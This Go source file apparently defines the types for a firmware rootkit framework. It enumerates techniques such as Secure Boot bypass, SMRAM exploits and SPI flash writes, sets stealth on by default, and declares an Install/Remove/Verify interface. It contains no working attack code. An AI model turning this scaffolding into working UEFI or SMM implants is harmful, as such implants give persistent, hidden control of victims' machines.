package rootkit

import (
	"time"

	"github.com/angel-platform/angel/pkg/types"
)

type RootkitTechnique string

const (
	TechniqueDXEDriver       RootkitTechnique = "dxedrvier"
	TechniqueBootChainHook   RootkitTechnique = "boot_chain_hook"
	TechniqueOSLHook         RootkitTechnique = "osl_hook"
	TechniqueCMHook          RootkitTechnique = "cm_hook"
	TechniqueSecureBootBypass RootkitTechnique = "secure_boot_bypass"
	TechniqueMOKEnroll       RootkitTechnique = "mok_enroll"
	TechniqueSelfReinstall   RootkitTechnique = "self_reinstall"
	TechniqueESPPersistence  RootkitTechnique = "esp_persistence"
	TechniqueShimExploit     RootkitTechnique = "shim_exploit"
	TechniqueHandlerInject   RootkitTechnique = "handler_inject"
	TechniqueSMRAMExploit    RootkitTechnique = "smram_exploit"
	TechniqueROPChain        RootkitTechnique = "rop_chain"
	TechniqueInterruptHook   RootkitTechnique = "interrupt_hook"
	TechniqueSPIFlashRead    RootkitTechnique = "spi_flash_read"
	TechniqueSPIFlashWrite   RootkitTechnique = "spi_flash_write"
	TechniqueJTAGDebug       RootkitTechnique = "jtag_debug"
	TechniqueUARTConsole     RootkitTechnique = "uart_console"
	TechniqueFirmwareEmulation RootkitTechnique = "firmware_emulation"
)

type RootkitLayer string

const (
	LayerUEFI    RootkitLayer = "uefi"
	LayerSMM     RootkitLayer = "smm"
	LayerFirmware RootkitLayer = "firmware"
)

type RootkitConfig struct {
	Platform     types.Platform   `json:"platform"`
	TargetArch   string           `json:"target_arch"`
	FirmwarePath string           `json:"firmware_path"`
	UEFIPath     string           `json:"uefi_path"`
	ESPPath      string           `json:"esp_path"`
	BackupPath   string           `json:"backup_path"`
	Stealth      bool             `json:"stealth"`
	Timeout      time.Duration    `json:"timeout"`
	MaxRetries   int              `json:"max_retries"`
	Metadata     map[string]string `json:"metadata"`
}

func DefaultRootkitConfig() *RootkitConfig {
	return &RootkitConfig{
		Platform:   types.PlatformLinux,
		TargetArch: "x86_64",
		ESPPath:    "/boot/efi",
		BackupPath: "/tmp/rootkit_backup",
		Stealth:    true,
		Timeout:    60 * time.Second,
		MaxRetries: 3,
		Metadata:   make(map[string]string),
	}
}

type RootkitResult struct {
	Success   bool              `json:"success"`
	Technique RootkitTechnique  `json:"technique"`
	Layer     RootkitLayer      `json:"layer"`
	InstalledAt time.Time       `json:"installed_at"`
	Details   map[string]string `json:"details"`
	Error     string            `json:"error"`
}

type RootkitMethod interface {
	Install(config *RootkitConfig) (*RootkitResult, error)
	Remove(config *RootkitConfig) error
	Verify(config *RootkitConfig) (bool, error)
	Name() string
	Layer() RootkitLayer
}

type FirmwareBackup struct {
	OriginalPath string    `json:"original_path"`
	BackupPath   string    `json:"backup_path"`
	Hash         string    `json:"hash"`
	Size         int64     `json:"size"`
	CreatedAt    time.Time `json:"created_at"`
}

type UEFIBackup struct {
	ESPPath     string           `json:"esp_path"`
	BootPath    string           `json:"boot_path"`
	ShimPath    string           `json:"shim_path"`
	GrubPath    string           `json:"grub_path"`
	MOKPath     string           `json:"mok_path"`
	Backups     []FirmwareBackup `json:"backups"`
	CreatedAt   time.Time        `json:"created_at"`
}

type SMMRegion struct {
	Start   uint64 `json:"start"`
	Size    uint64 `json:"size"`
	Access  string `json:"access"`
	Modified bool   `json:"modified"`
}

type SPIFlashInfo struct {
	ChipID    string `json:"chip_id"`
	VendorID  string `json:"vendor_id"`
	Capacity  uint64 `json:"capacity"`
	BlockSize uint64 `json:"block_size"`
	Writeable bool   `json:"writeable"`
}

type JTAGInfo struct {
	Interface string `json:"interface"`
	ChainLen  int    `json:"chain_len"`
	Devices   []string `json:"devices"`
	Speed     int    `json:"speed"`
}

type FirmwareEmulationConfig struct {
	UEFIFirmwarePath string `json:"uefi_firmware_path"`
	NVRAMPath        string `json:"nvram_path"`
	MemorySize       uint64 `json:"memory_size"`
	CPUCores         int    `json:"cpu_cores"`
	EnableDebug      bool   `json:"enable_debug"`
}
